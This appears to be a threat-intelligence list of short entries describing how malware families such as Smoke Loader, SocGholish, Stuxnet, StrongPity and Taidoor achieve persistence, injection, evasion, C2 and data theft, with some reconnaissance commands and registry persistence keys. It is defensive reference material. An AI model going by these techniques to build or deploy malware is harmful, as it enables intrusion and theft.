Smoke Loader deobfuscates its code.
Smoke Loader uses a simple one-byte XOR method to obfuscate values in the malware.
Smoke Loader recursively searches through directories for files.
Smoke Loader downloads a new version of itself once it has installed. It also downloads additional plugins.
Smoke Loader searches through Outlook files and directories (e.g., inbox, sent, templates, drafts, archives, etc.).
Smoke Loader spawns a new copy of c:\windows\syswow64\explorer.exe and then replaces the executable code in memory with malware.
Smoke Loader injects into the Internet Explorer process.
Smoke Loader adds a Registry Run key for persistence and adds a script in the Startup folder to deploy the payload.
Smoke Loader launches a scheduled task.
Smoke Loader scans processes to perform anti-VM checks.
Smoke Loader adds a Visual Basic script in the Startup folder to deploy the payload.
Smoke Loader uses HTTP for C2.
Snip3 can obfuscate strings using junk Chinese characters.
Snip3 can decode its second-stage PowerShell script prior to execution.
Snip3 has been delivered to targets via downloads from malicious domains.
Snip3 can execute PowerShell scripts in a hidden window.
Snip3 can download additional payloads to compromised systems.
Snip3 can gain execution through the download of visual basic files.
Snip3 has been executed through luring victims into clicking malicious links.
Snip3 can download and execute additional payloads and modules over separate communication channels.
Snip3 has the ability to obfuscate strings using XOR encryption.
Snip3 can use a PowerShell script for second-stage execution.
Snip3 can use RunPE to execute malicious payloads within a hollowed Windows process.
Snip3 can create a VBS file in startup to persist after system restarts.
Snip3 has been delivered to victims through malicious e-mail attachments.
Snip3 has been delivered to victims through e-mail links to malicious files.
Snip3 has the ability to detect Windows Sandbox, VMWare, or VirtualBox by querying `Win32_ComputerSystem` to extract the `Manufacturer` string.
Snip3 has the ability to query `Win32_ComputerSystem` for system information.
Snip3 can execute `WScript.Sleep` to delay execution of its second stage.
Snip3 can use visual basic scripts for first-stage execution.
Snip3 can download additional payloads from web services including Pastebin and top4top.
Snip3 can query the WMI class `Win32_ComputerSystem` to gather information.
SocGholish can profile compromised systems to identify domain trust relationships.
SocGholish has been distributed through compromised websites with malicious content often masquerading as browser updates.
The SocGholish JavaScript payload has been delivered within a compressed ZIP archive. SocGholish has also single or double Base-64 encoded references to its second-stage server URLs.
SocGholish can exfiltrate data directly to its C2 domain via HTTP.
SocGholish can download additional malware to infected hosts.
The SocGholish payload is executed as JavaScript.
SocGholish can send output from `whoami` to a local temp file using the naming convention `rad&lt;5-hex-chars&gt;.tmp`.
SocGholish has lured victims into interacting with malicious links on compromised websites for execution.
SocGholish has been named `AutoUpdater.js` to mimic legitimate update files.
SocGholish can list processes on targeted hosts.
SocGholish can identify the victim's browser in order to serve the correct fake update page.
SocGholish has been spread via emails containing malicious links.
SocGholish has the ability to enumerate system information including the victim computer name.
SocGholish can use IP-based geolocation to limit infections to victims in North America, Europe, and a small number of Asian-Pacific nations.
SocGholish has the ability to enumerate the domain name of a victim, as well as if the host is a member of an Active Directory domain.
SocGholish can use `whoami` to obtain the username from a compromised host.
SocGholish has used Amazon Web Services to host second-stage servers.
SocGholish has used WMI calls for script execution and system profiling.
Socksbot creates a suspended svchost process and injects its DLL into it.
Socksbot can write and execute PowerShell scripts.
Socksbot can list all running processes.
Socksbot can start SOCKS proxy threads.
Socksbot can take screenshots.
SodaMaster can use a hardcoded RSA key to encrypt some of its C2 traffic.
SodaMaster has the ability to download additional payloads from C2 to the targeted system.
SodaMaster can use &lt;code&gt;RegOpenKeyW&lt;/code&gt; to access the Registry.
SodaMaster can use "stackstrings" for obfuscation.
SodaMaster can search a list of running processes.
SodaMaster has the ability to query the Registry to detect a key specific to VMware.
SodaMaster can use RC4 to encrypt C2 communications.
SodaMaster can check for the presence of the Registry key &lt;code&gt;HKEY_CLASSES_ROOT\\Applications\\VMwareHostOpen.exe&lt;/code&gt; before proceeding to its main functionality.
SodaMaster can enumerate the host name and OS version on a target system.
SodaMaster can identify the username on a compromised host.
SodaMaster has the ability to put itself to "sleep" for a specified time.
SombRAT has encrypted collected data with AES-256 using a hardcoded key.
SombRAT can SSL encrypt C2 traffic.
SombRAT can communicate over DNS with the C2 server.
SombRAT has collected data and files from a compromised host.
SombRAT can run &lt;code&gt;upload&lt;/code&gt; to decrypt and upload files from storage.
SombRAT can use a custom DGA to generate a subdomain for C2.
SombRAT can execute &lt;code&gt;loadfromfile&lt;/code&gt;, &lt;code&gt;loadfromstorage&lt;/code&gt;, and &lt;code&gt;loadfrommem&lt;/code&gt; to inject a DLL  from disk, storage, or memory respectively.
SombRAT has uploaded collected data and files from a compromised host to its C2 server.
SombRAT has the ability to run &lt;code&gt;cancel&lt;/code&gt; or &lt;code&gt;closeanddeletestorage&lt;/code&gt; to remove all files from storage and delete the storage temp file on a compromised host.
SombRAT can execute &lt;code&gt;enum&lt;/code&gt; to enumerate files in storage on a compromised system.
SombRAT has the ability to download and execute additional payloads.
SombRAT can store harvested data in a custom database under the %TEMP% directory.
SombRAT can use a legitimate process name to hide itself.
SombRAT has the ability to respawn itself using &lt;code&gt;ShellExecuteW&lt;/code&gt; and &lt;code&gt;CreateProcessW&lt;/code&gt;.
SombRAT has the ability to use TCP sockets to send data and ICMP to ping the C2 server.
SombRAT can encrypt strings with XOR-based routines and use a custom AES storage format for plugins, configuration, C2 domains, and harvested data.
SombRAT has the ability to modify its process memory to hide process command-line arguments.
SombRAT can use the &lt;code&gt;getprocesslist&lt;/code&gt; command to enumerate processes on a compromised host.
SombRAT has the ability to use an embedded SOCKS proxy in C2 communications.
SombRAT has encrypted its C2 communications with AES.
SombRAT can execute &lt;code&gt;getinfo&lt;/code&gt; to enumerate the computer name and OS version of a compromised system.
SombRAT can execute &lt;code&gt;getinfo&lt;/code&gt;  to identify the username on a compromised host.
SombRAT can enumerate services on a victim machine.
SombRAT can execute &lt;code&gt;getinfo&lt;/code&gt;  to discover the current time on a compromised host.
SoreFang can decode and decrypt exfiltrated data sent to C2.
SoreFang can enumerate domain accounts via &lt;code&gt;net.exe user /domain&lt;/code&gt;.
SoreFang can enumerate domain groups by executing &lt;code&gt;net.exe group /domain&lt;/code&gt;.
SoreFang can gain access by exploiting a Sangfor SSL VPN vulnerability that allows for the placement and delivery of malicious update binaries.
SoreFang has the ability to list directories.
SoreFang can download additional payloads from C2.
SoreFang can collect usernames from the local system via &lt;code&gt;net.exe user&lt;/code&gt;.
SoreFang has the ability to encode and RC6 encrypt data sent to C2.
SoreFang can enumerate processes on a victim machine through use of Tasklist.
SoreFang can gain persistence through use of scheduled tasks.
SoreFang can collect the hostname, operating system configuration, product ID, and disk space on victim machines by executing Systeminfo.
SoreFang can collect the TCP/IP, DNS, DHCP, and network adapter configuration on a compromised host via &lt;code&gt;ipconfig.exe /all&lt;/code&gt;.
SoreFang can use HTTP in C2 communications.
Spark has used a custom XOR algorithm to decrypt the payload.
Spark has exfiltrated data over the C2 channel.
Spark has been packed with Enigma Protector to obfuscate its contents.
Spark has encoded communications with the C2 server with base64.
Spark can collect the hostname, keyboard layout, and language from the system.
Spark has checked the results of the &lt;code&gt;GetKeyboardLayoutList&lt;/code&gt; and the language name returned by &lt;code&gt;GetLocaleInfoA&lt;/code&gt; to make sure they contain the word “Arabic” before executing.
Spark has run the whoami command and has a built-in command to identify the user logged in.
Spark has used a splash screen to check whether an user actively clicks on the screen before running malicious code.
Spark has used HTTP POST requests to communicate with its C2 server to receive commands.
Spark can use cmd.exe to run commands.
SpeakUp uses Perl scripts.
SpeakUp uses cron tasks to ensure persistence.
SpeakUp encodes its second-stage payload with Base64.
SpeakUp attempts to exploit the following vulnerabilities in order to execute its malicious script: CVE-2012-0874, CVE-2010-1871, CVE-2017-10271, CVE-2018-2894, CVE-2016-3088, JBoss AS 3/4/5/6, and the Hadoop YARN ResourceManager.
SpeakUp deletes files to remove evidence on the machine.
SpeakUp downloads and executes additional files from a remote server.
SpeakUp checks for availability of specific ports on servers.
SpeakUp can perform brute forcing using a pre-defined list of usernames and passwords in an attempt to log in to administrative panels.
SpeakUp uses Python scripts.
SpeakUp encodes C&amp;C communication using Base64.
SpeakUp uses the &lt;code&gt;cat /proc/cpuinfo | grep -c “cpu family” 2&gt;&amp;1&lt;/code&gt; command to gather system information.
SpeakUp uses the &lt;code&gt;ifconfig -a&lt;/code&gt; command.
SpeakUp uses the &lt;code&gt;arp -a&lt;/code&gt; command.
SpeakUp uses the &lt;code&gt;whoami&lt;/code&gt; command.
SpeakUp uses POST and GET requests over HTTP to communicate with its main C&amp;C server.
SpicyOmelette has been signed with valid digital certificates.
SpicyOmelette has collected data and other information from a compromised host.
SpicyOmelette can download malicious files from threat actor controlled AWS URL's.
SpicyOmelette has the ability to execute arbitrary JavaScript code on a compromised host.
SpicyOmelette has been executed through malicious links within spearphishing emails.
SpicyOmelette can identify payment systems, payment gateways, and ATM systems in compromised environments.
SpicyOmelette can check for the presence of 29 different antivirus tools.
SpicyOmelette can enumerate running software on a targeted system.
SpicyOmelette has been distributed via emails containing a malicious link that appears to be a PDF document.
SpicyOmelette can identify the system name of a compromised host.
SpicyOmelette can identify the IP of a compromised system.
Squirrelwaffle has encrypted collected data using a XOR-based algorithm.
Squirrelwaffle has decrypted files and payloads using a XOR-based algorithm.
Squirrelwaffle has been obfuscated with a XOR-based algorithm.
Squirrelwaffle has exfiltrated victim data using HTTP POST requests to its C2 servers.
Squirrelwaffle has downloaded and executed additional encoded payloads.
Squirrelwaffle has relied on users enabling malicious macros within Microsoft Excel and Word attachments.
Squirrelwaffle has relied on victims to click on a malicious link send via phishing campaigns.
Squirrelwaffle has used PowerShell to execute its payload.
Squirrelwaffle has been executed using `regsvr32.exe`.
Squirrelwaffle has been executed using `rundll32.exe`.
Squirrelwaffle has been packed with a custom packer to hide payloads.
Squirrelwaffle has been distributed via malicious Microsoft Office documents within spam emails.
Squirrelwaffle has been distributed through phishing emails containing a malicious URL.
Squirrelwaffle has encoded its communications to C2 servers using Base64.
Squirrelwaffle has gathered victim computer information and configurations.
Squirrelwaffle has collected the victim’s external IP address.
Squirrelwaffle can collect the user name from a compromised host.
Squirrelwaffle has contained a hardcoded list of IP addresses to block that belong to sandboxes and analysis platforms.
Squirrelwaffle has used malicious VBA macros in Microsoft Word documents and Excel spreadsheets that execute an `AutoOpen` subroutine.
Squirrelwaffle has used HTTP POST requests for C2 communications.
Squirrelwaffle has used `cmd.exe` for execution.
SslMM contains a feature to manipulate process privileges and tokens.
SslMM identifies and kills anti-malware processes.
SslMM has a hard-coded primary and backup C2 string.
SslMM creates a new thread implementing a keylogging facility using Windows Keyboard Accelerators.
To establish persistence, SslMM identifies the Start Menu Startup directory and drops a link to its own executable disguised as an “Office Start,” “Yahoo Talk,” “MSN Gaming Z0ne,” or “MSN Talk” shortcut.
To establish persistence, SslMM identifies the Start Menu Startup directory and drops a link to its own executable disguised as an “Office Start,” “Yahoo Talk,” “MSN Gaming Z0ne,” or “MSN Talk” shortcut.
To establish persistence, SslMM identifies the Start Menu Startup directory and drops a link to its own executable disguised as an “Office Start,” “Yahoo Talk,” “MSN Gaming Z0ne,” or “MSN Talk” shortcut.
SslMM sends information to its hard-coded C2, including OS version, service pack information, processor speed, system name, and OS install date.
SslMM sends the logged-on username to its hard-coded C2.
Starloader decrypts and executes shellcode from a file called Stars.jps.
Starloader has masqueraded as legitimate software update packages such as Adobe Acrobat Reader and Intel.
StoneDrill has a disk wiper module that targets files other than those in the Windows directory.
StoneDrill can wipe the accessible physical or logical drives of the infected machine.
StoneDrill can wipe the master boot record of an infected computer.
StoneDrill has obfuscated its module with an alphabet-based table or XOR encryption.
StoneDrill has been observed deleting the temporary files once they fulfill their task.
StoneDrill has downloaded and dropped temporary files containing scripts; it additionally has a function to upload files from the victims machine.
StoneDrill has relied on injecting its payload directly into the process memory of the victim's preferred browser.
StoneDrill has looked in the registry to find the default browser path.
StoneDrill can take screenshots.
StoneDrill can check for antivirus and antimalware programs.
StoneDrill has the capability to discover the system OS, Windows version, architecture and environment.
StoneDrill can obtain the current date and time of the victim machine.
StoneDrill has used several anti-emulation techniques to prevent automated analysis by emulators or sandboxes.
StoneDrill has several VBS scripts used throughout the malware's lifecycle.
StoneDrill has used the WMI command-line (WMIC) utility to run tasks.
StreamEx has the ability to enumerate drive types.
StreamEx has the ability to modify the Registry.
StreamEx obfuscates some commands by using statically programmed fragments of strings when starting a DLL. It also uses a one-byte xor against 0x91 to encode configuration data.
StreamEx has the ability to enumerate processes.
StreamEx uses rundll32 to call an exported function.
StreamEx has the ability to scan for security tools such as firewalls and antivirus tools.
StreamEx has the ability to enumerate system information.
StreamEx has the ability to remotely execute commands.
StreamEx establishes persistence by installing a new service pointing to its DLL and setting the service to auto-start.
StrifeWater can collect data from a compromised host.
StrifeWater can send data and files from a compromised host to its C2 server.
StrifeWater can self delete to cover its tracks.
StrifeWater can enumerate files on a compromised host.
StrifeWater can download updates and auxiliary modules.
StrifeWater has been named `calc.exe` to appear as a legitimate calculator program.
StrifeWater can use a variety of APIs for execution.
StrifeWater has create a scheduled task named `Mozilla\Firefox Default Browser Agent 409046Z0FF4A39CB` for persistence.
StrifeWater has the ability to take screen captures.
StrifeWater can encrypt C2 traffic using XOR with a hard coded key.
StrifeWater can collect the OS version, architecture, and machine name to create a unique token for the infected host.
StrifeWater can collect the user name from the victim's machine.
StrifeWater can collect the time zone from the victim's machine.
StrifeWater can modify its sleep time responses from the default of 20-22 seconds.
StrifeWater can execute shell commands using `cmd.exe`.
StrongPity can compress and encrypt archived files into multiple .sft files with a repeated xor encryption scheme.
StrongPity has encrypted C2 traffic using SSL/TLS.
StrongPity has a file searcher component that can automatically collect and archive files based on a predefined list of file extensions.
StrongPity can automatically exfiltrate collected documents to the C2 server.
StrongPity has been signed with self-signed certificates.
StrongPity can add directories used by the malware to the Windows Defender exclusions list to prevent detection.
StrongPity has used encrypted strings in its dropper component.
StrongPity can exfiltrate collected documents through C2 channels.
StrongPity can delete previously exfiltrated files from the compromised host.
StrongPity can parse the hard drive on a compromised host to identify specific file extensions.
StrongPity has the ability to hide the console window for its document search module from the user.
StrongPity can download files to specified targets.
StrongPity has been executed via compromised installation files for legitimate software including compression applications, security software, browsers, file recovery applications, and other tools and utilities.
StrongPity has named services to appear legitimate.
StrongPity has been bundled with legitimate software installation files for disguise.
StrongPity can use multiple layers of proxy servers to hide terminal nodes in its infrastructure.
StrongPity has used HTTPS over port 1402 in C2 communication.
StrongPity can use PowerShell to add files to the Windows Defender exclusions list.
StrongPity can determine if a user is logged in by checking to see if explorer.exe is running.
StrongPity can use the &lt;code&gt;HKCU\Software\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt; Registry key for persistence.
StrongPity can identify if ESET or BitDefender antivirus are installed before dropping its payload.
StrongPity can install a service to execute itself as a service.
StrongPity can identify the hard disk volume serial number on a compromised host.
StrongPity can identify the IP address of a compromised host.
StrongPity can use HTTP and HTTPS in C2 communications.
StrongPity has created new services and modified existing services for persistence.
Stuxnet encrypts exfiltrated data via C2 with static 31-byte long XOR keys.
Stuxnet used a digitally signed driver with a compromised Realtek certificate.
Stuxnet infected WinCC machines via a hardcoded database server password.
Stuxnet decrypts resources that are loaded into memory and executed.
Stuxnet enumerates user accounts of the domain.
Stuxnet attempts to access network resources with a domain account’s credentials.
Stuxnet injects an entire DLL into an existing, newly created, or preselected trusted process.
Stuxnet uses encrypted configuration blocks and writes encrypted files to disk.
Stuxnet checks for specific operating systems on 32-bit machines, Registry keys, and dates for vulnerabilities, and will exit execution if the values are not met.
Stuxnet sends compromised victim information via HTTP.
Stuxnet used MS10-073 and an undisclosed Task Scheduler vulnerability to escalate privileges on local Windows machines.
Stuxnet propagates using the MS10-061 Print Spooler and MS08-067 Windows Server Service vulnerabilities.
Stuxnet has the ability to generate new C2 domains.
Stuxnet uses an RPC server that contains a routine for file deletion and also removes itself from the system through a DLL export by deleting specific files.
Stuxnet uses a driver to scan for specific filesystem driver objects.
Stuxnet reduces the integrity level of objects to allow write actions.
Stuxnet can delete OLE Automation and SQL stored procedures used to store malicious payloads.
Stuxnet installs an RPC server for P2P communications.
Stuxnet uses an RPC server that contains a file dropping routine and support for payload version updates for P2P communications within a victim network.
Stuxnet enumerates user accounts of the local host.
Stuxnet can create registry keys to load driver files.
Stuxnet uses the SetSecurityDescriptorDacl API to reduce object integrity levels.
Stuxnet enumerates the directories of a network resource.
Stuxnet enumerates removable drives for infection.
Stuxnet searches the Registry for indicators of security programs.
Stuxnet can propagate via peer-to-peer communication and updates using RPC.
Stuxnet can propagate via removable media using an autorun.inf file or the CVE-2010-2568 LNK vulnerability.
Stuxnet uses a Windows rootkit to mask its binaries and other relevant files.
Stuxnet propagates to available network shares.
Stuxnet used xp_cmdshell to store and execute SQL code.
Stuxnet schedules a network job to execute two minutes after host infection.
Stuxnet enumerates the currently running processes related to a variety of security products.
Stuxnet calls LoadLibrary then executes exports from a DLL.
Stuxnet transforms encrypted binary data into an ASCII string in order to use it as a URL parameter value.
Stuxnet encodes the payload of system information sent to the command and control servers using a one byte 0xFF XOR key. Stuxnet also uses a 31-byte long static byte string to XOR data sent to command and control servers. The servers use a different static key to encrypt replies to the implant.
Stuxnet collects system information including computer and domain names, OS version, and S7P paths.
Stuxnet collects the IP address of a compromised system.
Stuxnet collects the time and date of a system when it is infected.
Stuxnet infects remote servers via network shares and by infecting WinCC database views with malicious code.
Stuxnet extracts and writes driver files that match the times of other legitimate files.
Stuxnet attempts to impersonate an anonymous token to enumerate bindings in the service control manager.
Stuxnet uses HTTP to communicate with a command and control server.
Stuxnet used WMI with an &lt;code&gt;explorer.exe&lt;/code&gt; token to execute on a remote share.
Stuxnet uses a driver registered as a boot start service as the main load-point.
Sykipot uses SSL for encrypting C2 communications.
Sykipot may use &lt;code&gt;net group "domain admins" /domain&lt;/code&gt; to display accounts in the "domain admins" permissions group and &lt;code&gt;net localgroup "administrators"&lt;/code&gt; to list local system administrator group membership.
Sykipot injects itself into running instances of outlook.exe, iexplore.exe, or firefox.exe.
Sykipot contains keylogging functionality to steal passwords.
Sykipot is known to contain functionality that enables targeting of smart card technologies to proxy authentication for connections to restricted network resources using detected hardware tokens.
Sykipot may gather a list of running processes by running &lt;code&gt;tasklist /v&lt;/code&gt;.
Sykipot has been known to establish persistence by adding programs to the Run Registry key.
Sykipot may use &lt;code&gt;net view /domain&lt;/code&gt; to display hostnames of available systems on a network.
Sykipot may use &lt;code&gt;ipconfig /all&lt;/code&gt; to gather system network configuration details.
Sykipot may use &lt;code&gt;netstat -ano&lt;/code&gt; to display active network connections.
Sykipot may use &lt;code&gt;net start&lt;/code&gt; to display running services.
SynAck clears event logs.
SynAck encrypts the victims machine followed by asking the victim to pay a ransom.
SynAck checks its directory location in an attempt to avoid launching in a sandbox.
SynAck can manipulate Registry keys.
SynAck parses the export tables of system DLLs to locate and call various Windows API functions.
SynAck payloads are obfuscated prior to compilation to inhibit analysis and/or reverse engineering.
SynAck enumerates all running processes.
SynAck abuses NTFS transactions to launch and conceal malicious processes.
SynAck enumerates Registry keys associated with event logs.
SynAck checks its directory location in an attempt to avoid launching in a sandbox.
SynAck gathers computer names, OS version info, and also checks installed keyboard layouts to estimate if it has been launched from a certain list of countries.
SynAck lists all the keyboard layouts installed on the victim’s system using &lt;code&gt;GetKeyboardLayoutList&lt;/code&gt; API and checks against a hardcoded language code list. If a match if found, SynAck sleeps for 300 seconds and then exits without encrypting files.
SynAck gathers user names from infected hosts.
SynAck enumerates all running services.
Sys10 collects the group name of the logged-in user and sends it to the C2.
Sys10 uses an XOR 0x1 loop to encrypt its C2 domain.
Sys10 collects the computer name, OS versioning information, and OS install date and sends the information to the C2.
Sys10 collects the local IP address of the victim and sends it to the C2.
Sys10 collects the account name of the logged-in user and sends it to the C2.
Sys10 uses HTTP for C2.
SysUpdate has been signed with stolen digital certificates.
SysUpdate can load DLLs through vulnerable legitimate executables.
SysUpdate has used DNS TXT requests as for its C2 communication.
SysUpdate can collect information and files from a compromised host.
SysUpdate can deobfuscate packed binaries in memory.
SysUpdate can encrypt and encode its configuration file.
SysUpdate has exfiltrated data over its C2 channel.
SysUpdate can delete its configuration file from the targeted system.
SysUpdate can search files on a compromised host.
SysUpdate can store its encoded configuration file within &lt;code&gt;Software\Classes\scConfig&lt;/code&gt; in either &lt;code&gt;HKEY_LOCAL_MACHINE&lt;/code&gt; or &lt;code&gt;HKEY_CURRENT_USER&lt;/code&gt;.
SysUpdate has the ability to set file attributes to hidden.
SysUpdate has the ability to download files to a compromised host.
SysUpdate can contact the DNS server operated by Google as part of its C2 establishment process.
SysUpdate has named their unit configuration file similarly to other unit files residing in the same directory, `/usr/lib/systemd/system/`, to appear benign.
SysUpdate can write its configuration file to &lt;code&gt;Software\Classes\scConfig&lt;/code&gt; in either &lt;code&gt;HKEY_LOCAL_MACHINE&lt;/code&gt; or &lt;code&gt;HKEY_CURRENT_USER&lt;/code&gt;.
SysUpdate can call the `GetNetworkParams` API as part of its C2 establishment process.
SysUpdate can collect information about running processes.
SysUpdate can use a Registry Run key to establish persistence.
SysUpdate has the ability to capture screenshots.
SysUpdate can manage services and processes.
SysUpdate has been packed with VMProtect.
SysUpdate has used Base64 to encode its C2 traffic.
SysUpdate has used DES to encrypt all C2 communications.
SysUpdate can collect a system's architecture, operating system version, hostname, and drive information.
SysUpdate can collected the IP address and domain name of a compromised host.
SysUpdate can collect the username from a compromised host.
SysUpdate can collect a list of services on a victim machine.
SysUpdate can copy a script to the user owned `/usr/lib/systemd/system/` directory with a symlink mapped to a `root` owned directory, `/etc/ystem/system`, in the unit configuration file's `ExecStart` directive to establish persistence and elevate privileges.
SysUpdate can use WMI for execution on a compromised host.
SysUpdate can create a service to establish persistence.
Systeminfo can be used to gather information about the operating system.
If a victim meets certain criteria, T9000 uses the AppInit_DLL functionality to achieve persistence by ensuring that every user mode process that is spawned will load its malicious DLL, ResN32.dll. It does this by creating the following Registry keys: &lt;code&gt;HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs – %APPDATA%\Intel\ResN32.dll&lt;/code&gt; and &lt;code&gt;HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\LoadAppInit_DLLs – 0x1&lt;/code&gt;.
T9000 encrypts collected data using a single byte XOR key.
T9000 uses the Skype API to record audio and video calls. It writes encrypted data to &lt;code&gt;%APPDATA%\Intel\Skype&lt;/code&gt;.
T9000 searches removable storage devices for files with a pre-defined list of file extensions (e.g. * .doc, *.ppt, *.xls, *.docx, *.pptx, *.xlsx). Any matching files are encrypted and written to a local user directory.
During the T9000 installation process, it drops a copy of the legitimate Microsoft binary igfxtray.exe. The executable contains a side-loading weakness which is used to load a portion of the malware.
T9000 searches through connected drives for removable storage devices.
T9000 can take screenshots of the desktop and target application windows, saving them to user directories as one byte XOR encrypted .dat files.
T9000 performs checks for various antivirus and security products during installation.
T9000 gathers and beacons the operating system build number and CPU Architecture (32-bit/64-bit) during installation.
T9000 gathers and beacons the MAC and IP addresses during installation.
T9000 gathers and beacons the username of the logged in account during installation. It will also gather the username of running processes to determine if it is running as SYSTEM.
T9000 gathers and beacons the system time during installation.
T9000 uses the Skype API to record audio and video calls. It writes encrypted data to &lt;code&gt;%APPDATA%\Intel\Skype&lt;/code&gt;.
TAINTEDSCRIBE has used &lt;code&gt;FileReadZipSend&lt;/code&gt; to compress a file and send to C2.
TAINTEDSCRIBE can execute &lt;code&gt;FileRecvWriteRand&lt;/code&gt; to append random bytes to the end of a file received from C2.
TAINTEDSCRIBE can randomly pick one of five hard-coded IP addresses for C2 communication; if one of the IP fails, it will wait 60 seconds and then try another IP address.
TAINTEDSCRIBE can delete files from a compromised host.
TAINTEDSCRIBE can use &lt;code&gt;DirectoryList&lt;/code&gt; to enumerate files in a specified directory.
TAINTEDSCRIBE can download additional modules from its C2 server.
The TAINTEDSCRIBE main executable has disguised itself as Microsoft’s Narrator.
TAINTEDSCRIBE can execute &lt;code&gt;ProcessList&lt;/code&gt; for process discovery.
TAINTEDSCRIBE has used FakeTLS for session authentication.
TAINTEDSCRIBE can copy itself into the current user’s Startup folder as “Narrator.exe” for persistence.
The TAINTEDSCRIBE command and execution module can perform target system enumeration.
TAINTEDSCRIBE uses a Linear Feedback Shift Register (LFSR) algorithm for network encryption.
TAINTEDSCRIBE can use &lt;code&gt;DriveList&lt;/code&gt; to retrieve drive information.
TAINTEDSCRIBE can execute &lt;code&gt;GetLocalTime&lt;/code&gt; for time discovery.
TAINTEDSCRIBE can change the timestamp of specified filenames.
TAINTEDSCRIBE can enable Windows CLI access and execute files.
TDTESS creates then deletes log files during installation of itself as a service.
TDTESS has a command to download and execute an additional file.
After creating a new service for persistence, TDTESS sets the file creation time for the service to the creation time of the victim's legitimate svchost.exe file.
TDTESS provides a reverse shell on the victim.
If running as administrator, TDTESS installs itself as a new service named bmwappushservice to establish persistence.
TEARDROP was decoded using a custom rolling XOR algorithm to execute a customized Cobalt Strike payload.
TEARDROP files had names that resembled legitimate Window file and directory names.
TEARDROP modified the Registry to create a Windows service for itself on a compromised host.
TEARDROP created and read from a file with a fake JPG header, and its payload was encrypted with a simple rotating XOR cipher.
TEARDROP checked that &lt;code&gt;HKU\SOFTWARE\Microsoft\CTF&lt;/code&gt; existed before decoding its embedded payload.
TEARDROP ran as a Windows service from the &lt;code&gt;c:\windows\syswow64&lt;/code&gt; folder.
TEXTMATE uses DNS TXT records for C2.
TEXTMATE executes cmd.exe to provide a reverse shell to adversaries.
When a document is found matching one of the extensions in the configuration, TINYTYPHON uploads it to the C2 server.
TINYTYPHON has used XOR with 0x90 to obfuscate its configuration file.
TINYTYPHON searches through the drive containing the OS, then all drive letters C through to Z, for documents matching certain extensions.
TINYTYPHON installs itself under Registry Run key to establish persistence.
TSCookie has the ability to steal saved passwords from the Internet Explorer, Edge, Firefox, and Chrome browsers.
TSCookie has the ability to decrypt, load, and execute a DLL and its resources.
TSCookie has the ability to discover drive information on the infected host.
TSCookie has the ability to upload and download files to and from the infected host.
TSCookie has been executed via malicious links embedded in e-mails spoofing the Ministries of Education, Culture, Sports, Science and Technology of Japan.
TSCookie can use ICMP to receive information on the destination server.
TSCookie has the ability to list processes on the infected host.
TSCookie has the ability to inject code into the svchost.exe, iexplorer.exe, explorer.exe, and default browser processes.
TSCookie has the ability to proxy communications with command and control (C2) servers.
TSCookie has encrypted network communications with RC4.
TSCookie has the ability to identify the IP of the infected host.
TSCookie can multiple protocols including HTTP and HTTPS in communication with command and control (C2) servers.
TSCookie has the ability to execute shell commands on the infected host.
TURNEDUP is capable of injecting code into the APC queue of a created Rundll32 process as part of an "Early Bird injection."
TURNEDUP is capable of downloading additional files.
TURNEDUP is capable of writing to a Registry Run key to establish.
TURNEDUP is capable of taking screenshots.
TURNEDUP is capable of gathering system information.
TURNEDUP is capable of creating a reverse shell.
One TYPEFRAME variant decrypts an archive using an RC4 key, then decompresses and installs the decrypted malicious DLL module. Another variant decodes the embedded file by XORing it with the value "0x35".
TYPEFRAME can open the Windows Firewall on the victim’s machine to allow incoming connections.
APIs and strings in some TYPEFRAME variants are RC4 encrypted. Another variant is encoded with XOR.
TYPEFRAME can delete files off the system.
TYPEFRAME can search directories for files on the victim’s machine.
TYPEFRAME can install and store encrypted configuration data under the Registry key &lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellCompatibility\Applications\laxhost.dll&lt;/code&gt; and &lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\PrintConfigs&lt;/code&gt;.
TYPEFRAME can upload and download files to the victim’s machine.
A Word document delivering TYPEFRAME prompts the user to enable macro execution.
TYPEFRAME can install encrypted configuration data under the Registry key &lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellCompatibility\Applications\laxhost.dll&lt;/code&gt; and &lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\PrintConfigs&lt;/code&gt;.
TYPEFRAME has used ports 443, 8080, and 8443 with a FakeTLS method.
A TYPEFRAME variant can force the compromised system to function as a proxy server.
TYPEFRAME can gather the disk volume information.
TYPEFRAME has used a malicious Word document for delivery with VBA macros for execution.
TYPEFRAME can uninstall malware components using a batch script. TYPEFRAME can execute commands using a shell.
TYPEFRAME variants can add malicious DLL modules as new services.TYPEFRAME can also delete services from the victim’s machine.
Taidoor can upload data and files from a victim's machine.
Taidoor can use a stream cipher to decrypt stings used by the malware.
Taidoor can perform DLL loading.
Taidoor can use encrypted string blocks for obfuscation.
Taidoor can use &lt;code&gt;DeleteFileA&lt;/code&gt; to remove files from infected hosts.
Taidoor can search for specific files.
Taidoor has downloaded additional files onto a compromised host.
Taidoor has relied upon a victim to click on a malicious email attachment.
Taidoor has the ability to modify the Registry on compromised hosts using &lt;code&gt;RegDeleteValueA&lt;/code&gt; and &lt;code&gt;RegCreateKeyExA&lt;/code&gt;.
Taidoor has the ability to use native APIs for execution including &lt;code&gt;GetProcessHeap&lt;/code&gt;, &lt;code&gt;GetProcAddress&lt;/code&gt;, and &lt;code&gt;LoadLibrary&lt;/code&gt;.
Taidoor can use TCP for C2 communications.
Taidoor can use &lt;code&gt;GetCurrentProcessId&lt;/code&gt; for process discovery.
Taidoor can query the Registry on compromised hosts using &lt;code&gt;RegQueryValueExA&lt;/code&gt;.
Taidoor has modified the &lt;code&gt;HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt; key for persistence.
Taidoor has been delivered through spearphishing emails.
Taidoor uses RC4 to encrypt the message body of HTTP content.
Taidoor has collected the MAC address of a compromised host; it can also use &lt;code&gt;GetAdaptersInfo&lt;/code&gt; to identify network adapters.
Taidoor can use &lt;code&gt;GetLocalTime&lt;/code&gt; and &lt;code&gt;GetSystemTime&lt;/code&gt; to collect system time.
Taidoor has used HTTP GET and POST requests for C2.
Taidoor can copy cmd.exe into the system temp folder.
